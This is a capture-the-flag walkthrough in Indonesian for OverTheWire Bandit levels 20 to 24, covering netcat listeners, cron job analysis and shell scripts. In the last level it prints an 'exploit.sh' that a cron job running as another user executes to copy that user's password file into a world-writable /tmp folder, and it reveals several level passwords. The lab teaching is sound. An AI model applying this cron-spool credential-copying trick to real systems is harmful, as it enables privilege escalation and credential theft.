# 📁 Level 20 ➔ 23: Local Connections & Permissions

Pada fase ini, tantangan berfokus pada bagaimana proses saling berinteraksi di dalam sistem Linux, manajemen hak akses (permissions), dan pengenalan pada otomatisasi tugas.

| Level | Materi Utama | Perintah Penting |
| :--- | :--- | :--- |
| **20-21** | Connect-back Sockets | `nc -lp`, `jobs`, `fg` |
| **21-22** | Cronjob Analysis | `ls -la /etc/cron.d/`, `cat` |
| **22-23** | Shell Script Analysis | `bash`, `sh`, `tmp folders` |

---

## 📝 Detailed Writeups

### Level 20 - Level 21
There is a `setuid binary` in the `homedirectory` that does the following: it makes a connection to `localhos`t on the `port` you specify as a commandline argument. It then reads a line of text from the connection and compares it to the password in the previous level (bandit20). If the password is correct, it will transmit the password for the next level (bandit21).

**NOTE:** Try connecting to your own network daemon to see if it works as you think

- Writeup
    
    Level ini mengajarkan konsep **Network Sockets** dan komunikasi antar-proses. Kita harus membuat sebuah *listener* (server mini) yang akan menerima koneksi dari program setuid `./suconnect`. Program tersebut akan mengirimkan password level saat ini, dan jika kita mengirimkan balik password yang sama, ia akan memberikan password level berikutnya.
    
    ```bash
    # Cek file yang ada di direktori home
    ls -l
    
    # Buka port listener di background dan siapkan password level 20 untuk dikirim
    # Ganti [PASSWORD_LEVEL_20] dengan password asli Anda
    echo "VxCazJaVykH6Lv6yueYv17Zb02uS2Scf" | nc -l -p 1234 &
    
    # Jalankan program suconnect untuk menghubungkan ke port yang baru kita buka
    ./suconnect 1234
    ```
    
    - **`nc -l -p 1234`**: Menggunakan **Netcat** untuk mendengarkan (*listen*) pada port 1234.
    - **`&`**: Menjalankan perintah di *background* sehingga kita bisa mengetikkan perintah selanjutnya tanpa harus menutup listener tersebut.
    - **`./suconnect 1234`**: Menjalankan binary yang akan mencoba melakukan koneksi ke localhost pada port 1234. Program ini akan mengirimkan password bandit20 ke port tersebut dan menunggu balasan yang sama.
    - **`echo "[pass]" | nc ...`**: Mengirimkan string password secara otomatis segera setelah `./suconnect` melakukan koneksi ke listener kita.

---

### Level 21 - Level 22
A program is running automatically at regular intervals from **`cron`**, the time-based job scheduler. Look in **`/etc/cron.d/`** for the configuration and see what command is being executed.

- Writeup
    
    Password untuk level berikutnya disimpan di dalam sebuah file di `/etc/bandit_pass/bandit22`, namun hanya bisa dibaca oleh user `bandit22`. Sebuah tugas otomatis (*cron job*) berjalan secara berkala sebagai user `bandit22` untuk menjalankan script yang membocorkan password tersebut ke lokasi tertentu.
    
    ```bash
    # Melihat daftar pekerjaan cron yang tersedia
    ls /etc/cron.d/
    
    # Memeriksa isi konfigurasi cron untuk bandit22
    cat /etc/cron.d/cronjob_bandit22
    
    # Membaca isi script shell yang dijalankan oleh cron tersebut
    cat /usr/bin/cronjob_bandit22.sh
    
    # Membaca file password yang dihasilkan oleh script di direktori /tmp
    cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
    ```
    
    - **`ls /etc/cron.d/`**: Digunakan untuk melihat daftar tugas terjadwal yang didefinisikan secara sistem.
    - **`cat /etc/cron.d/cronjob_bandit22`**: Perintah ini menunjukkan bahwa ada script yang berjalan setiap menit (`* * * *`) sebagai user `bandit22`.
    - **`cat /usr/bin/cronjob_bandit22.sh`**: Membedah logika script. Di dalamnya terdapat perintah: `cat /etc/bandit_pass/bandit22 > /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv`. Artinya, password disalin ke file di `/tmp`.
    - `cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv`: Membaca file hasil salinan tersebut untuk mendapatkan password asli milik bandit22.

---

### Level 22 → Level 23
A program is running automatically at regular intervals from **`cron`**, the time-based job scheduler. Look in **`/etc/cron.d/`** for the configuration and see what command is being executed.

**NOTE:** Looking at shell scripts written by other people is a very useful skill. The script for this level is intentionally made easy to read. If you are having problems understanding what it does, try executing it to see the debug information it prints.

- Writeup
    
    Level ini memperkenalkan konsep **Cron jobs**, yaitu sistem penjadwalan tugas otomatis di Linux. Tantangannya adalah kita harus menganalisis sebuah skrip shell yang dijalankan oleh user lain (`bandit23`) untuk mengetahui di mana ia menyimpan password level berikutnya.
    
    ```bash
    # Mencari tugas otomatis yang berjalan di sistem
    ls /etc/cron.d/
    
    # Membaca isi konfigurasi cron job milik bandit23
    cat /etc/cron.d/cronjob_bandit23
    
    # Menganalisis isi skrip yang dijalankan secara otomatis tersebut
    cat /usr/bin/cronjob_bandit23.sh
    
    # SIMULASI LOGIKA: Hitung nama file target jika user-nya adalah 'bandit23'
    # Kita jalankan perintah ini secara manual untuk menebak nama file rahasianya
    echo I am user bandit23 | md5sum | cut -d ' ' -f 1
    # Output: 8ca319486bfbbc3663ea0fbe81326349
    
    # Membaca file password yang sudah dibuat oleh sistem (cron) di folder /tmp
    cat /tmp/8ca319486bfbbc3663ea0fbe81326349
    ```
    
    - **`ls /etc/cron.d/`**: Melihat daftar file tugas terjadwal. Di sini kita menemukan adanya tugas untuk `bandit23`.
    - **`cat /usr/bin/cronjob_bandit23.sh`**: Membedah logika skrip. Skrip tersebut mengambil nama user (`whoami`), mengubahnya menjadi string hash MD5, lalu menyalin password ke `/tmp/[nama_hash]`.
    - **`echo I am user bandit23 | md5sum`**: Karena skrip asli menggunakan variabel `$myname`, kita menggantinya secara manual dengan `bandit23` untuk mengetahui "nama file rahasia" yang dihasilkan oleh sistem khusus untuk level berikutnya.
    - **`cut -d ' ' -f 1`**: Memotong hasil MD5 agar kita hanya mendapatkan string hash-nya saja tanpa karakter tambahan.
    - **`cat /tmp/8ca3...`**: Mengambil password yang sudah diletakkan di sana oleh tugas otomatis (cron) yang berjalan setiap menit.

---

### Level 23 → Level 24
A program is running automatically at regular intervals from **`cron`**, the time-based job scheduler. Look in **`/etc/cron.d/`** for the configuration and see what command is being executed.

**NOTE:** This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!

**NOTE 2:** Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…

- Writeup
    
    Level ini mengajarkan cara mengeksploitasi **Cron Job** (tugas otomatis) yang berjalan dengan hak akses user lain. Kita akan membuat shell script sederhana agar user `bandit24` mengambilkan password untuk kita.
    
    ```bash
    # Buat direktori kerja sementara di /tmp dan beri izin akses penuh
    mkdir /tmp/solusi_bandit24
    chmod 777 /tmp/solusi_bandit24
    cd /tmp/solusi_bandit24
    
    # Buat script payload untuk mengambil password
    echo '#!/bin/bash' > exploit.sh
    echo 'cat /etc/bandit_pass/bandit24 > /tmp/solusi_bandit24/password.txt' >> exploit.sh
    
    # Beri izin eksekusi pada script agar bisa dijalankan oleh Cron
    chmod 777 exploit.sh
    
    # Salin script ke direktori yang dipantau oleh cronjob bandit24
    cp exploit.sh /var/spool/bandit24/foo/
    
    # Tunggu hingga 1 menit (karena cron berjalan setiap menit)
    # Cek secara berkala sampai file password.txt muncul
    ls -la
    cat password.txt
    ```
    
    - **`mkdir /tmp/solusi_bandit24`**: Membuat folder di area sementara karena kita tidak bisa menulis file di home directory.
    - **`chmod 777`**: Memberikan izin **Read, Write, Execute** kepada semua user. Ini wajib agar user `bandit24` (yang menjalankan cron) bisa membaca script kita dan menulis hasilnya ke folder kita.
    - **`#!/bin/bash`**: Baris *shebang* yang wajib ada agar sistem tahu bahwa ini adalah script shell.
    - **`cat /etc/bandit_pass/bandit24 > ...`**: Isi perintah dalam script. Kita menyuruh user `bandit24` membaca password-nya sendiri dan menyimpannya ke file teks di folder kita.
    - **`cp exploit.sh /var/spool/bandit24/foo/`**: Meletakkan script di folder "tugas" bandit24. Semua file di folder ini akan dijalankan otomatis lalu dihapus oleh sistem.